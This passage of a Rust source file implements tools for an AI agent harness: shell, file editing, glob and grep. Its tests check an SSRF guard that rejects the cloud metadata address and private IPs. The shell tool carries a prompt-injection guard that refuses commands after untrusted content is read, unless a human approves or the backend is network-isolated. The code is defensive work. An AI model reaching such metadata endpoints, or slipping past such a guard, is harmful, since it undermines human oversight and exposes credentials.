        assert!(!glob_match("a*b*c", "axxbyy"));
        assert!(glob_match("a?c", "abc"));
        // A pathological pattern that would hang the OLD exponential matcher returns promptly.
        assert!(!glob_match("a*a*a*a*a*a*a*a*b", &"a".repeat(64)));
    }

    // resolve_guarded is what every redirect hop re-runs, so a 3xx to a private/metadata IP is
    // rejected at the next hop. It must reject the same internal targets and pin public ones.
    #[tokio::test]
    async fn resolve_guarded_pins_public_and_rejects_internal() {
        assert!(resolve_guarded("http://169.254.169.254/latest/meta-data/")
            .await
            .is_err());
        assert!(resolve_guarded("http://127.0.0.1/").await.is_err());
        assert!(resolve_guarded("http://10.0.0.5/").await.is_err());
        assert!(resolve_guarded("http://[::1]/").await.is_err());
        assert!(resolve_guarded("ftp://example.com/").await.is_err());
        let ok = resolve_guarded("https://1.1.1.1/path")
            .await
            .expect("public IP must pass");
        assert_eq!(ok.host, "1.1.1.1");
        assert_eq!(ok.addrs[0].port(), 443, "https default port");
        assert!(ok.addrs.iter().all(|a| a.ip().to_string() == "1.1.1.1"));
        // Explicit port is honored (so the pin connects to the right port).
        let p = resolve_guarded("http://1.1.1.1:8080/").await.unwrap();
        assert_eq!(p.addrs[0].port(), 8080);
    }

    // resolve_trusted is used only for the user-configured SearXNG URL: it must ALLOW a self-hosted
    // instance on localhost / a LAN box (which resolve_guarded rejects), while still refusing the
    // always-invalid targets and keeping http(s)-only.
    #[tokio::test]
    async fn resolve_trusted_allows_local_but_not_invalid() {
        // The whole point: a self-hosted SearXNG on localhost / LAN is reachable.
        let lh = resolve_trusted("http://127.0.0.1:8080/search")
            .await
            .expect("localhost must pass for a trusted, user-set URL");
        assert_eq!(lh.addrs[0].port(), 8080);
        assert!(resolve_trusted("http://192.168.1.50:8080/").await.is_ok());
        // Still rejected even when trusted: never-valid targets and non-http schemes.
        assert!(resolve_trusted("http://0.0.0.0/").await.is_err());
        assert!(resolve_trusted("http://255.255.255.255/").await.is_err());
        assert!(resolve_trusted("ftp://localhost/").await.is_err());
    }

    #[test]
    fn absolutize_handles_every_redirect_shape() {
        assert_eq!(
            absolutize("https://a.com/x/y", "https://b.com/z"),
            "https://b.com/z"
        );
        assert_eq!(
            absolutize("https://a.com/x/y", "//b.com/z"),
            "https://b.com/z"
        );
        assert_eq!(absolutize("https://a.com/x/y", "/z"), "https://a.com/z");
        assert_eq!(absolutize("https://a.com/x/y", "z"), "https://a.com/x/z");
    }
}

#[cfg(test)]
mod html_text_tests {
    use super::{decode_entities, html_to_text};
    #[test]
    fn multibyte_content_does_not_panic_and_is_preserved() {
        // The exact crash class that aborted the daemon ("Couldn't reach Engram"): a multibyte char
        // ('’', emoji) in a long page, where a byte index lands inside the codepoint.
        let big = format!(
            "<html><body><p>{}it’s a test 🌍 with — dashes</p></body></html>",
            "word ".repeat(40000)
        );
        let out = html_to_text(&big); // must not panic
        assert!(out.contains("it’s"), "multibyte preserved, not mangled");
        assert!(out.contains("🌍"));
        assert!(!out.contains('<'));
    }
    #[test]
    fn drops_script_and_style_keeps_text() {
        let h = "<style>body{color:red}</style><p>Hello</p><script>alert(1)</script>";
        assert_eq!(html_to_text(h), "Hello");
    }

    #[test]
    fn prefers_main_region_and_drops_chrome() {
        // Nav/footer boilerplate must NOT survive when a <main> region is present.
        let h = "<html><head><title>Doc</title></head><body>\
                 <nav><a href='/'>Home</a><a href='/x'>Pricing</a></nav>\
                 <main><h1>Real Heading</h1><p>The actual content lives here and is long enough \
                 to clear the main-region threshold so the extractor trusts it.</p></main>\
                 <footer>© 2026 BoilerCorp · Privacy · Terms</footer></body></html>";
        let out = html_to_text(h);
        assert!(out.starts_with("Doc"), "title leads: {out:?}");
        assert!(out.contains("Real Heading") && out.contains("actual content"));
        assert!(!out.contains("Pricing"), "nav dropped: {out:?}");
        assert!(!out.contains("BoilerCorp"), "footer dropped: {out:?}");
    }

    #[test]
    fn decodes_entities_and_keeps_block_structure() {
        let h = "<h1>Title</h1><p>caf&eacute; &amp; tea &#8364;5 &#x2014; nice</p><p>Second</p>";
        let out = html_to_text(h);
        assert!(
            out.contains("café & tea €5 — nice"),
            "entities decoded: {out:?}"
        );
        // Distinct paragraphs are separated by a blank line, not run together into one wall.
        assert!(
            out.contains("nice\n\nSecond"),
            "block structure preserved: {out:?}"
        );
    }

    #[test]
    fn unknown_entity_and_stray_ampersand_survive() {
        assert_eq!(
            html_to_text("<p>AT&T R&D &unknownthing;</p>"),
            "AT&T R&D &unknownthing;"
        );
    }

    // Regression: a '&' followed by 11+ entity-ish bytes then a multibyte char (no ';') used to slice
    // the look-ahead window mid-codepoint and panic — which, under `panic = "abort"`, killed the whole
    // daemon mid-run and showed up in the browser only as "Load failed". Must not panic; '&' survives.
    #[test]
    fn ampersand_before_multibyte_does_not_panic() {
        // 'ä' starts right after 11 ASCII chars past '&', exactly the byte offset that crashed before.
        assert_eq!(decode_entities("&abcdefghijkä"), "&abcdefghijkä");
        // Real German/Tangier-style text with accents around stray ampersands stays intact.
        assert_eq!(decode_entities("Tangerä & Café"), "Tangerä & Café");
        // Valid entities still decode even when multibyte text surrounds them.
        assert_eq!(
            decode_entities("Über caf&eacute; &amp; thé"),
            "Über café & thé"
        );
        // A numeric entity butting against a multibyte char.
        assert_eq!(decode_entities("5&#8364;ä"), "5€ä");
    }
}

#[cfg(test)]
mod shell_backend_tests {
    use super::shell_command;
    use std::path::Path;

    #[test]
    fn local_backend() {
        let (prog, args) = shell_command(None, Path::new("/w"), "ls -la");
        assert_eq!(prog, "sh");
        assert_eq!(args, vec!["-c".to_string(), "ls -la".to_string()]);
    }

    #[test]
    fn docker_backend_is_network_isolated() {
        let (prog, args) = shell_command(Some("alpine"), Path::new("/w"), "echo hi");
        assert_eq!(prog, "docker");
        assert!(args.contains(&"--network".to_string()) && args.contains(&"none".to_string()));
        assert!(args.contains(&"alpine".to_string()));
        assert!(args.contains(&"echo hi".to_string()));
        assert!(args.contains(&"/w:/work".to_string()));
    }

    #[test]
    fn ssh_backend_runs_remotely() {
        let (prog, args) = shell_command(Some("ssh:deploy@vps.example"), Path::new("/w"), "uptime");
        assert_eq!(prog, "ssh");
        assert_eq!(
            args,
            vec!["deploy@vps.example".to_string(), "uptime".to_string()]
        );
    }

    #[test]
    fn singularity_backend_execs_in_image() {
        let (prog, args) = shell_command(Some("singularity:img.sif"), Path::new("/w"), "id");
        assert_eq!(prog, "singularity");
        assert_eq!(
            args,
            vec![
                "exec".to_string(),
                "img.sif".to_string(),
                "sh".to_string(),
                "-c".to_string(),
                "id".to_string()
            ]
        );
    }
}

pub struct ShellTool;

#[async_trait]
impl Tool for ShellTool {
    fn name(&self) -> &str {
        "shell"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Run a shell command in the working directory and return its output. Disabled \
         unless explicitly enabled, and refused on a run that has read untrusted content."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "command": { "type": "string" } }, "required": ["command"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if !ctx.policy.allow_shell {
            return Err("shell tool is disabled (set ENGRAM_TOOLS_SHELL=1 to enable)".into());
        }
        let backend = ctx.policy.shell_backend.as_deref();
        if ctx.taint.is_untrusted() {
            // The injection guard blocks shell on a tainted run because untrusted content could steer
            // a command to exfiltrate/damage. Two things safely lift it, and both are ledgered:
            //   (a) an explicit one-time human approval (the same `approved` escape the egress gate
            //       uses) — a human is watching and signed off on running-after-reading; or
            //   (b) a network-isolated backend — the built-in OS `sandbox` (network-denied) or the
            //       Docker backend (`docker run --network none`, see `shell_command`): with no
            //       network there IS no exfiltration channel, the precise risk the taint gate stops.
            //       `ssh:` (runs on a remote host with network) and `singularity:` (no network flag)
            //       are NOT isolated, so they still require explicit approval.
            let sandboxed = match backend {
                Some("sandbox") => true,
                Some(b) if b.starts_with("ssh:") || b.starts_with("singularity:") => false,
                Some(_) => true, // docker image → --network none
                None => false,   // plain local shell → full network
            };
            if ctx.policy.approved {
                let _ = ctx.ledger.append(
                    "agent.shell_deescalated",
                    "agent",
                    json!({ "reason": "user_approved" }),
                );
            } else if sandboxed {
                let _ = ctx.ledger.append(
                    "agent.shell_deescalated",
                    "agent",
                    json!({ "reason": "network_isolated_sandbox", "backend": backend }),
                );
            } else {
                return Err(
                    "shell refused: this run read untrusted content (injection guard). Get the user's \
                     one-time approval, or run in the network-isolated Docker sandbox, to proceed."
                        .into(),
                );
            }
        }
        let command = arg_str(args, "command")?;
        let _ = ctx.ledger.append(
            "agent.shell",
            "agent",
            json!({ "command": command, "backend": backend.unwrap_or("local") }),
        );
        let (program, cmd_args) = shell_command(backend, &ctx.workdir, command);
        // kill_on_drop: when the timeout fires the future is dropped — without this the `sh -c`
        // child (an infinite loop, a long download) keeps running unbounded with full privileges
        // AFTER the agent was told the command timed out, and can still mutate the workdir mid-run.
        let fut = tokio::process::Command::new(&program)
            .args(&cmd_args)
            .current_dir(&ctx.workdir)
            .kill_on_drop(true)
            .output();
        let out = tokio::time::timeout(Duration::from_secs(ctx.policy.timeout_secs), fut)
            .await
            .map_err(|_| "command timed out".to_string())?
            .map_err(|e| e.to_string())?;
        Ok(format!(
            "exit={}\n--- stdout ---\n{}\n--- stderr ---\n{}",
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        ))
    }
}

// ---------------------------------------------------------------------------
// Files
// ---------------------------------------------------------------------------

pub struct ReadFileTool;

#[async_trait]
impl Tool for ReadFileTool {
    fn name(&self) -> &str {
        "read_file"
    }
    fn description(&self) -> &str {
        "Read a UTF-8 text file inside the working directory. Use the optional 0-based `offset` \
         (start line) and `limit` (number of lines) to page through a large file; the response \
         header reports the file's total line and byte count so you know how much remains."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": {
            "path": { "type": "string" },
            "offset": { "type": "integer", "description": "0-based first line to return" },
            "limit": { "type": "integer", "description": "max lines to return (default 250)" }
        }, "required": ["path"] })
    }
    // Local files may hold private data, so reading one marks the run sensitive (arms no-egress).
    fn reads_sensitive(&self) -> bool {
        true
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        let text = tokio::fs::read_to_string(&path)
            .await
            .map_err(|e| e.to_string())?;
        let total_bytes = text.len();
        let lines: Vec<&str> = text.lines().collect();
        let total_lines = lines.len();
        let offset = args["offset"].as_u64().unwrap_or(0) as usize;
        let limit = (args["limit"].as_u64().unwrap_or(250) as usize).clamp(1, 2000);
        if total_lines == 0 {
            return Ok("(empty file)".into());
        }
        if offset >= total_lines {
            return Err(format!(
                "offset {offset} is past the end ({total_lines} lines)"
            ));
        }
        let end = (offset + limit).min(total_lines);
        let body = lines[offset..end].join("\n");
        let more = if end < total_lines {
            format!(
                " — {} more line(s), read with offset {end}",
                total_lines - end
            )
        } else {
            String::new()
        };
        Ok(format!(
            "[lines {}-{} of {total_lines} · {total_bytes} bytes{more}]\n{body}",
            offset + 1,
            end
        ))
    }
}

pub struct WriteFileTool;

#[async_trait]
impl Tool for WriteFileTool {
    fn name(&self) -> &str {
        "write_file"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Create or overwrite a text file inside the working directory. For LARGE content (over \
         ~150 lines), send the first part here and continue with append_file calls - one huge \
         call can exceed the output limit and fail."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "path": { "type": "string" }, "content": { "type": "string" } },
            "required": ["path", "content"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if !ctx.policy.allow_write {
            return Err("file writing is disabled".into());
        }
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        // Accept common synonyms a model might use for the body, and give a clear, recoverable error
        // (the old one fired even when the model DID send content under a different key, or when a
        // huge value got truncated — and the model just retried the same broken call until stopped).
        let content = ["content", "text", "body", "data", "contents"]
            .iter()
            .find_map(|k| args[*k].as_str())
            .ok_or("write_file needs the file text in a 'content' string argument")?;
        if let Some(parent) = path.parent() {
            tokio::fs::create_dir_all(parent)
                .await
                .map_err(|e| e.to_string())?;
        }
        tokio::fs::write(&path, content)
            .await
            .map_err(|e| e.to_string())?;
        let _ = ctx.ledger.append(
            "agent.write",
            "agent",
            json!({ "path": path.to_string_lossy(), "bytes": content.len() }),
        );
        Ok(format!("wrote {} bytes", content.len()))
    }
}

pub struct ListDirTool;

#[async_trait]
impl Tool for ListDirTool {
    fn name(&self) -> &str {
        "list_dir"
    }
    fn description(&self) -> &str {
        "List entries of a directory inside the working directory."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "path": { "type": "string" } } })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let rel = args["path"].as_str().unwrap_or(".");
        let path = confine(&ctx.workdir, rel)?;
        let mut rd = tokio::fs::read_dir(&path)
            .await
            .map_err(|e| e.to_string())?;
        let mut out = Vec::new();
        while let Some(e) = rd.next_entry().await.map_err(|e| e.to_string())? {
            let kind = if e.path().is_dir() { "dir " } else { "file" };
            out.push(format!("{kind}  {}", e.file_name().to_string_lossy()));
        }
        out.sort();
        Ok(if out.is_empty() {
            "(empty)".into()
        } else {
            out.join("\n")
        })
    }
}

/// Surgical, single-occurrence text replacement - the best-in-class harness edit primitive. The
/// model sends the exact `old` text and its `new` replacement; the edit is rejected unless `old`
/// occurs exactly once, so it can never silently change the wrong place or drop the rest of a file.
pub struct EditFileTool;

#[async_trait]
impl Tool for EditFileTool {
    fn name(&self) -> &str {
        "edit_file"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Replace a unique substring in a file inside the working directory. `old` should match \
         verbatim; if it doesn't match exactly, a whitespace-tolerant per-line match is tried as a \
         fallback (so indentation/trailing-space drift doesn't fail the edit). The match must still \
         be UNIQUE or the edit is refused. The safe way to change part of a file without re-sending \
         it. Keep old/new SMALL - one function or block per call; make several calls for bigger \
         changes (huge payloads can exceed the output limit)."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": {
                "path": { "type": "string" },
                "old": { "type": "string", "description": "text to replace (verbatim preferred; must resolve to a unique location)" },
                "new": { "type": "string", "description": "replacement text" }
            },
            "required": ["path", "old", "new"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if !ctx.policy.allow_write {
            return Err("file writing is disabled".into());
        }
        let rel = arg_str_any(args, PATH_KEYS)?;
        let path = confine(&ctx.workdir, rel)?;
        let old = arg_str(args, "old")?;
        // 'new' is REQUIRED by the schema: defaulting a dropped/mistyped value to "" silently
        // DELETED the matched text. An explicit "" is still a legitimate deletion.
        let new = args["new"].as_str().ok_or(
            "missing string argument 'new' (pass \"\" explicitly to delete the matched text)",
        )?;
        if old.is_empty() {
            return Err("'old' must not be empty".into());
        }
        let text = tokio::fs::read_to_string(&path)
            .await
            .map_err(|e| e.to_string())?;
        let count = text.matches(old).count();
        let (updated, how) = if count == 1 {
            (text.replacen(old, new, 1), "exact")
        } else if count > 1 {
            return Err(format!(
                "'old' matched {count} times - include more surrounding context so it is unique"
            ));
        } else {
            // Exact match failed — the dominant cause is whitespace/indent drift in `old`. Try a
            // whitespace-tolerant block match that STILL requires a unique location before writing.
            match fuzzy_locate(&text, old) {
                FuzzyMatch::Unique { start, end } => {
                    let mut u = String::with_capacity(text.len() + new.len());
                    u.push_str(&text[..start]);
                    u.push_str(new);
                    u.push_str(&text[end..]);
                    (u, "whitespace-insensitive")
                }
                FuzzyMatch::Ambiguous(n) => {
                    return Err(format!(
                        "'old' was not found verbatim and matched {n} places ignoring whitespace - \
                         add more surrounding context so it is unique"
                    ))
                }
                FuzzyMatch::NotFound(hint) => {
                    return Err(match hint {
                        Some(h) => {
                            format!("'old' text was not found in the file. Did you mean:\n{h}")
                        }
                        None => "'old' text was not found in the file".into(),
                    })
                }
            }
        };
        tokio::fs::write(&path, &updated)
            .await
            .map_err(|e| e.to_string())?;
        let _ = ctx.ledger.append(
            "agent.edit",
            "agent",
            json!({ "path": path.to_string_lossy(), "removed": old.len(), "added": new.len(), "match": how }),
        );
        Ok(format!(
            "edited {rel} ({how} match, −{} +{} bytes)",
            old.len(),
            new.len()
        ))
    }
}

/// Outcome of fuzzy-locating `old` within a file.
enum FuzzyMatch {
    /// A unique block; replace exactly `text[start..end]`.
    Unique { start: usize, end: usize },
    /// Matched in `n` places — too risky to guess.
    Ambiguous(usize),
    /// No block matched; carries an optional "did you mean" hint.
    NotFound(Option<String>),
}

/// Byte spans `(start, end_excluding_newline)` of each line in `text`, mirroring `str::lines()`
/// (no trailing empty line when the file ends in `\n`).
fn line_spans(text: &str) -> Vec<(usize, usize)> {
    let mut spans = Vec::new();
    let bytes = text.as_bytes();
    let mut start = 0;
    for (i, &b) in bytes.iter().enumerate() {
        if b == b'\n' {
            spans.push((start, i));
            start = i + 1;
        }
    }
    if start < bytes.len() {
        spans.push((start, bytes.len()));
    }
    spans
}

/// Locate `old` in `text` tolerating per-line leading/trailing whitespace differences — the dominant
/// reason an otherwise-correct `old` fails to match (indentation or trailing-space drift). Matches a
/// contiguous block of lines and returns the EXACT byte range to replace, but ONLY if that block
/// occurs exactly once: fuzzy matching never sacrifices edit_file's uniqueness safety.
fn fuzzy_locate(text: &str, old: &str) -> FuzzyMatch {
    let spans = line_spans(text);
    let file_trim: Vec<&str> = spans.iter().map(|&(s, e)| text[s..e].trim()).collect();
    let old_trim: Vec<&str> = old.lines().map(str::trim).collect();
    let k = old_trim.len();
    if k == 0 || k > file_trim.len() {
        return FuzzyMatch::NotFound(None);
    }
    let hits: Vec<usize> = (0..=file_trim.len() - k)
        .filter(|&i| (0..k).all(|j| file_trim[i + j] == old_trim[j]))
        .collect();
    match hits.len() {
        1 => {
            let i = hits[0];
            FuzzyMatch::Unique {
                start: spans[i].0,
                end: spans[i + k - 1].1,
            }
        }
        0 => FuzzyMatch::NotFound(closest_hint(&spans, &file_trim, text, old_trim[0])),
        n => FuzzyMatch::Ambiguous(n),
    }
}

/// A "did you mean" pointer: the file line that best matches `old`'s first line, by trimmed equality
/// then containment. Helps the model fix a near-miss without re-reading the whole file.
fn closest_hint(
    spans: &[(usize, usize)],
    file_trim: &[&str],
    text: &str,
    needle: &str,
) -> Option<String> {
    if needle.is_empty() {
        return None;
    }
    let idx = file_trim
        .iter()
        .position(|l| *l == needle)
        .or_else(|| file_trim.iter().position(|l| l.contains(needle)))?;
    let (s, e) = spans[idx];
    Some(format!("  line {}: {}", idx + 1, &text[s..e]))
}

/// Append text to a file (creating it if needed) - cheaper than read+rewrite for logs/notes.
pub struct AppendFileTool;

#[async_trait]
impl Tool for AppendFileTool {
    fn name(&self) -> &str {
        "append_file"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Append text to the end of a file inside the working directory (creates it if absent)."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "path": { "type": "string" }, "content": { "type": "string" } },
            "required": ["path", "content"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if !ctx.policy.allow_write {
            return Err("file writing is disabled".into());
        }
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        let content = arg_str_any(args, CONTENT_KEYS)?;
        if let Some(parent) = path.parent() {
            tokio::fs::create_dir_all(parent)
                .await
                .map_err(|e| e.to_string())?;
        }
        use tokio::io::AsyncWriteExt;
        let mut f = tokio::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&path)
            .await
            .map_err(|e| e.to_string())?;
        f.write_all(content.as_bytes())
            .await
            .map_err(|e| e.to_string())?;
        // Flush before returning so a subsequent read observes the append deterministically (the
        // tokio File buffers, and dropping it doesn't guarantee the bytes are visible yet).
        f.flush().await.map_err(|e| e.to_string())?;
        let _ = ctx.ledger.append(
            "agent.append",
            "agent",
            json!({ "path": path.to_string_lossy(), "bytes": content.len() }),
        );
        Ok(format!("appended {} bytes", content.len()))
    }
}

/// Filesystem housekeeping confined to the workdir: make_dir / move_file / copy_file / delete_file.
pub struct MakeDirTool;

#[async_trait]
impl Tool for MakeDirTool {
    fn name(&self) -> &str {
        "make_dir"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Create a directory (and parents) inside the working directory."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "path": { "type": "string" } }, "required": ["path"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if !ctx.policy.allow_write {
            return Err("file writing is disabled".into());
        }
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        tokio::fs::create_dir_all(&path)
            .await
            .map_err(|e| e.to_string())?;
        let _ = ctx.ledger.append(
            "agent.mkdir",
            "agent",
            json!({ "path": path.to_string_lossy() }),
        );
        Ok(format!("created {}", arg_str_any(args, PATH_KEYS)?))
    }
}

pub struct MoveFileTool;

#[async_trait]
impl Tool for MoveFileTool {
    fn name(&self) -> &str {
        "move_file"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Move or rename a file/directory within the working directory (`from` -> `to`)."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "from": { "type": "string" }, "to": { "type": "string" } },
            "required": ["from", "to"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if !ctx.policy.allow_write {
            return Err("file writing is disabled".into());
        }
        let from = confine(&ctx.workdir, arg_str(args, "from")?)?;
        let to = confine(&ctx.workdir, arg_str(args, "to")?)?;
        if from == ctx.workdir || to == ctx.workdir {
            return Err("refusing to move the working directory itself".into());
        }
        if let Some(parent) = to.parent() {
            tokio::fs::create_dir_all(parent)
                .await
                .map_err(|e| e.to_string())?;
        }
        tokio::fs::rename(&from, &to)
            .await
            .map_err(|e| e.to_string())?;
        let _ = ctx.ledger.append(
            "agent.move",
            "agent",
            json!({ "from": from.to_string_lossy(), "to": to.to_string_lossy() }),
        );
        Ok(format!(
            "moved {} -> {}",
            arg_str(args, "from")?,
            arg_str(args, "to")?
        ))
    }
}

pub struct CopyFileTool;

#[async_trait]
impl Tool for CopyFileTool {
    fn name(&self) -> &str {
        "copy_file"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Copy a file within the working directory (`from` -> `to`)."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": { "from": { "type": "string" }, "to": { "type": "string" } },
            "required": ["from", "to"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if !ctx.policy.allow_write {
            return Err("file writing is disabled".into());
        }
        let from = confine(&ctx.workdir, arg_str(args, "from")?)?;
        let to = confine(&ctx.workdir, arg_str(args, "to")?)?;
        if let Some(parent) = to.parent() {
            tokio::fs::create_dir_all(parent)
                .await
                .map_err(|e| e.to_string())?;
        }
        let n = tokio::fs::copy(&from, &to)
            .await
            .map_err(|e| e.to_string())?;
        let _ = ctx.ledger.append(
            "agent.copy",
            "agent",
            json!({ "from": from.to_string_lossy(), "to": to.to_string_lossy(), "bytes": n }),
        );
        Ok(format!("copied {n} bytes -> {}", arg_str(args, "to")?))
    }
}

pub struct DeleteFileTool;

#[async_trait]
impl Tool for DeleteFileTool {
    fn name(&self) -> &str {
        "delete_file"
    }
    fn side_effecting(&self) -> bool {
        true
    }
    fn description(&self) -> &str {
        "Delete a file (or an empty directory) inside the working directory."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object", "properties": { "path": { "type": "string" } }, "required": ["path"] })
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        if !ctx.policy.allow_write {
            return Err("file writing is disabled".into());
        }
        let path = confine(&ctx.workdir, arg_str_any(args, PATH_KEYS)?)?;
        if path == ctx.workdir {
            return Err("refusing to delete the working directory itself".into());
        }
        let meta = tokio::fs::metadata(&path)
            .await
            .map_err(|e| e.to_string())?;
        if meta.is_dir() {
            tokio::fs::remove_dir(&path)
                .await
                .map_err(|e| e.to_string())?;
        } else {
            tokio::fs::remove_file(&path)
                .await
                .map_err(|e| e.to_string())?;
        }
        let _ = ctx.ledger.append(
            "agent.delete",
            "agent",
            json!({ "path": path.to_string_lossy() }),
        );
        Ok(format!("deleted {}", arg_str_any(args, PATH_KEYS)?))
    }
}

/// Find files by glob pattern (`*`, `?`, `**`) recursively within the workdir - the discovery
/// primitive a real harness needs (non-recursive `list_dir` alone can't find anything).
pub struct GlobTool;

#[async_trait]
impl Tool for GlobTool {
    fn name(&self) -> &str {
        "glob"
    }
    fn description(&self) -> &str {
        "Find files matching a glob pattern (e.g. `**/*.rs`, `src/*.md`) within the working \
         directory. `*` matches within a path segment, `**` matches across segments, `?` one char."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": {
                "pattern": { "type": "string" },
                "path": { "type": "string", "description": "subdir to search under (default '.')" }
            },
            "required": ["pattern"] })
    }
    fn reads_sensitive(&self) -> bool {
        true
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let pattern = arg_str(args, "pattern")?;
        let root = confine(&ctx.workdir, args["path"].as_str().unwrap_or("."))?;
        let base = std::fs::canonicalize(&ctx.workdir).unwrap_or_else(|_| ctx.workdir.clone());
        let mut out = Vec::new();
        let mut stack = vec![root];
        let limit = 500usize;
        while let Some(dir) = stack.pop() {
            let mut rd = match tokio::fs::read_dir(&dir).await {
                Ok(rd) => rd,
                Err(_) => continue,
            };
            while let Some(e) = rd.next_entry().await.map_err(|e| e.to_string())? {
                let p = e.path();
                let ft = e.file_type().await.map_err(|e| e.to_string())?;
                if ft.is_dir() {
                    // skip the usual heavy/noise dirs
                    let name = e.file_name();
                    let n = name.to_string_lossy();
                    if n == ".git" || n == "node_modules" || n == "target" {
                        continue;
                    }
                    stack.push(p);
                } else {
                    let rel = p
                        .strip_prefix(&base)
                        .or_else(|_| p.strip_prefix(&ctx.workdir))
                        .unwrap_or(&p);
                    let rels = rel.to_string_lossy().replace('\\', "/");
                    // Don't surface a symlink that escapes the workdir (resolve + prefix-check).
                    if std::fs::canonicalize(&p)
                        .map(|c| !c.starts_with(&base))
                        .unwrap_or(true)
                    {
                        continue;
                    }
                    if glob_match(pattern, &rels) {
                        out.push(rels);
                        if out.len() >= limit {
                            out.push(format!("(stopped at {limit} matches)"));
                            out.sort();
                            return Ok(out.join("\n"));
                        }
                    }
                }
            }
        }
        out.sort();
        Ok(if out.is_empty() {
            "(no matches)".into()
        } else {
            out.join("\n")
        })
    }
}

/// Search file contents for a fixed string (optionally case-insensitive), returning `file:line`
/// hits - the content-discovery primitive (`grep`) every capable agent harness exposes.
pub struct GrepTool;

#[async_trait]
impl Tool for GrepTool {
    fn name(&self) -> &str {
        "grep"
    }
    fn description(&self) -> &str {
        "Search file contents within the working directory for a literal string and return \
         `path:line: text` hits. Optional `glob` to restrict files and `ignore_case`."
    }
    fn schema(&self) -> Value {
        json!({ "type": "object",
            "properties": {
                "query": { "type": "string" },
                "glob": { "type": "string", "description": "only search files matching this glob" },
                "ignore_case": { "type": "boolean" }
            },
            "required": ["query"] })
    }
    fn reads_sensitive(&self) -> bool {
        true
    }
    async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
        let query = arg_str(args, "query")?;
        let ignore_case = args["ignore_case"].as_bool().unwrap_or(false);
        let needle = if ignore_case {
            query.to_lowercase()
        } else {
            query.to_string()
        };
        let glob = args["glob"].as_str();
        let base = std::fs::canonicalize(&ctx.workdir).unwrap_or_else(|_| ctx.workdir.clone());
        let mut out = Vec::new();
        let mut stack = vec![ctx.workdir.clone()];
        let limit = 200usize;
        while let Some(dir) = stack.pop() {
            let mut rd = match tokio::fs::read_dir(&dir).await {
                Ok(rd) => rd,
                Err(_) => continue,
            };
            while let Some(e) = rd.next_entry().await.map_err(|e| e.to_string())? {
                let p = e.path();
                let ft = e.file_type().await.map_err(|e| e.to_string())?;
                if ft.is_dir() {
                    let n = e.file_name();
                    let n = n.to_string_lossy();
                    if n == ".git" || n == "node_modules" || n == "target" {
                        continue;
                    }
                    stack.push(p);
                    continue;
                }
                let rel = p
                    .strip_prefix(&base)
                    .or_else(|_| p.strip_prefix(&ctx.workdir))
                    .unwrap_or(&p);
                let rels = rel.to_string_lossy().replace('\\', "/");
                if let Some(g) = glob {
                    if !glob_match(g, &rels) {
                        continue;
                    }
                }
                // Don't follow an in-workdir symlink that points OUTSIDE the workdir (confine bypass):
                // resolve the real path and require it to stay under the canonical workdir.
                if std::fs::canonicalize(&p)
                    .map(|c| !c.starts_with(&base))
                    .unwrap_or(true)
                {
                    continue;
                }
                // Read as text; skip binaries / unreadable files quietly.
                let Ok(text) = tokio::fs::read_to_string(&p).await else {
                    continue;
                };
                for (i, line) in text.lines().enumerate() {
                    let hay = if ignore_case {
                        line.to_lowercase()
                    } else {
                        line.to_string()
                    };
                    if hay.contains(&needle) {
                        let shown: String = line.chars().take(200).collect();
                        out.push(format!("{rels}:{}: {}", i + 1, shown.trim()));
                        if out.len() >= limit {
                            out.push(format!("(stopped at {limit} hits)"));
                            return Ok(out.join("\n"));
                        }
                    }
                }
            }
        }
        Ok(if out.is_empty() {
            "(no matches)".into()
        } else {
            out.join("\n")
        })
    }
}

/// Minimal glob matcher over a `/`-separated relative path. Supports `*` (within a segment),
/// `**` (across segments), and `?` (one char). Good enough for find-by-pattern without a dep.
pub(crate) fn glob_match(pattern: &str, path: &str) -> bool {
    // Iterative two-pointer wildcard match with a single backtrack anchor - O(len(p)*len(t)) worst
